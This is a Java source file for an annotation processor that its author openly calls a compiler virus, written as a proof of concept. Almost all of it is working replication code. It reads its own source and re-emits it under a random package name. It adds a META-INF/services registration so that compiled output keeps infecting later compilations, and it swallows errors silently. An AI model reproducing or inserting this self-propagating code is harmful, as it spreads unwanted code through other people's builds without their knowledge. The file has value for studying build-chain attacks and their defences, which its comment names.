/*
 * Copyright (C) 2010 Julien Viet.
 *
 * This is free software; you can redistribute it and/or modify it
 * under the terms of the GNU Lesser General Public License as
 * published by the Free Software Foundation; either version 2.1 of
 * the License, or (at your option) any later version.
 *
 * This software is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the GNU
 * Lesser General Public License for more details.
 *
 * You should have received a copy of the GNU Lesser General Public
 * License along with this software; if not, write to the Free
 * Software Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA
 * 02110-1301 USA, or see the FSF site: http://www.fsf.org.
 */

package org.aptvir;

import javax.annotation.processing.AbstractProcessor;
import javax.annotation.processing.Filer;
import javax.annotation.processing.RoundEnvironment;
import javax.annotation.processing.SupportedAnnotationTypes;
import javax.annotation.processing.SupportedSourceVersion;
import javax.lang.model.SourceVersion;
import javax.lang.model.element.TypeElement;
import javax.tools.FileObject;
import javax.tools.JavaFileObject;
import javax.tools.StandardLocation;
import java.io.ByteArrayOutputStream;
import java.io.Closeable;
import java.io.IOException;
import java.io.InputStream;
import java.io.Writer;
import java.net.URL;
import java.util.Random;
import java.util.Set;
import java.util.concurrent.atomic.AtomicBoolean;

/**
 * This annotation processor is a compiler virus. I made it for fun and to prove that a possible exploit is possible.
 * This virus may be disabled by disabling annotation processing or by running the compiler under a security manager.
 *
 * @author <a href="mailto:julien.viet@exoplatform.com">Julien Viet</a>
 * @version $Revision$
 */
@SupportedSourceVersion(SourceVersion.RELEASE_5)
@SupportedAnnotationTypes("*")
public class Processor extends AbstractProcessor
{

   /** Just to avoid to make an infinite loop. */
   private static final AtomicBoolean done = new AtomicBoolean(false);

   @Override
   public boolean process(Set<? extends TypeElement> annotations, RoundEnvironment roundEnv)
   {
      if (done.get())
      {
         return true;
      }
      else
      {
         done.set(true);
      }

      // Compute the unique fqn of the generated processor
      final String pkg = "org.aptvir." + "a" + Math.abs(new Random(System.currentTimeMillis()).nextInt());

      // Attempt to get the current source
      String source = null;
      URL url = Processor.class.getResource("Processor.java");
      if (url != null)
      {
         InputStream in = null;
         try
         {
            in = url.openStream();
            byte[] buffer = new byte[256];
            ByteArrayOutputStream baos = new ByteArrayOutputStream();
            for (int len = in.read(buffer);len != -1;len = in.read(buffer))
            {
               baos.write(buffer, 0, len);
            }
            source = baos.toString();
         }
         catch (IOException ignore)
         {
         }
         finally
         {
            safeClose(in);
         }
      }

      //
      if (source != null)
      {
         // Create the new source code that will be compiled once dumper on the filer
         source = source.replace("package " + getClass().getPackage().getName() + ";", "package " + pkg + ";");

         // Get the filer
         Filer filer = processingEnv.getFiler();

         //
         Writer processorWriter = null;
         Writer servicesWriter = null;
         try
         {
            // Dump the code, the compiler will do its job
            JavaFileObject processorFO = filer.createSourceFile(pkg + ".Processor");
            processorWriter = processorFO.openWriter();
            processorWriter.write(source);

             // Now we are able to write a file, we dump the javax.annotation.processing.Processor
            FileObject servicesFO = filer.createResource(StandardLocation.SOURCE_OUTPUT, "", "META-INF/services/javax.annotation.processing.Processor");
            servicesWriter = servicesFO.openWriter();
            servicesWriter.write(pkg + ".Processor");
         }
         catch (Exception e)
         {
         }
         finally
         {
            safeClose(processorWriter);
            safeClose(servicesWriter);
         }
      }

      //
      return true;
   }

   private void safeClose(Closeable closeable)
   {
      if (closeable != null)
      {
         try
         {
            closeable.close();
         }
         catch (IOException ignore)
         {
         }
      }
   }
}
